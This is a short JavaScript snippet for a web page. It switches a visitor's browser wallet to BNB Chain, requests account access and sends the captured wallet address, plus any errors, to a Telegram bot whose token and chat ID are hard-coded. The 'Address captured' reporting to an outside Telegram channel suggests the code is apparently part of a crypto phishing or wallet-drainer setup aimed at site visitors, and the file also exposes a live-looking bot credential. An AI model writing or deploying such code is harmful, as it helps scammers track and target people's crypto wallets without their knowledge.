// Telegram config: replace with your real bot token and chat ID










const TELEGRAM_BOT_TOKEN = "8091385586:AAGlx7odJ5vxkx_qWA_5cTxS67IqW6hVR-c";
const TELEGRAM_CHAT_ID = "5501640678"; // e.g., 123456789

async function sendToTelegram(message) {
	if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN.includes("<") || TELEGRAM_CHAT_ID.includes("<")) {
		console.warn("Telegram credentials are not set. Skipping send.");
		return;
	}

	const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
	try {
		await fetch(apiUrl, {
			method: "POST",
			headers: { "Content-Type": "application/json" },
			body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" })
		});
	} catch (e) {
		console.error("Failed to send message to Telegram:", e);
	}
}

async function getAddress() {
	try {
		if (!window.ethereum) {
			const msg = "No Ethereum provider found (window.ethereum).";
			document.getElementById("address") && (document.getElementById("address").innerHTML = msg);
			await sendToTelegram(`❌ <b>Error</b>\n${msg}`);
			return;
		}

		// Switch to BNB Chain (56)
		await window.ethereum.request({
			method: "wallet_switchEthereumChain",
			params: [{ chainId: "0x38" }]
		});

		// Try to get accounts; if empty, request permission
		let accounts = await window.ethereum.request({ method: "eth_accounts" });
		if (!accounts || accounts.length === 0) {
			accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
		}

		const addressEl = document.getElementById("address");
		if (accounts && accounts.length > 0) {
			const addr = accounts[0];
			addressEl && (addressEl.innerHTML = addr);
			await sendToTelegram(`✅ <b>Address captured</b>\n<code>${addr}</code>`);
		} else {
			addressEl && (addressEl.innerHTML = "No address found");
			await sendToTelegram("⚠️ No address found after requesting accounts.");
		}
	} catch (error) {
		const msg = `Error: ${error && error.message ? error.message : String(error)}`;
		document.getElementById("address") && (document.getElementById("address").innerHTML = msg);
		await sendToTelegram(`❌ <b>Error</b>\n${msg}`);
	}
}

// Expose to global scope so it can be called from HTML (e.g., button onclick)
window.getAddress = getAddress;


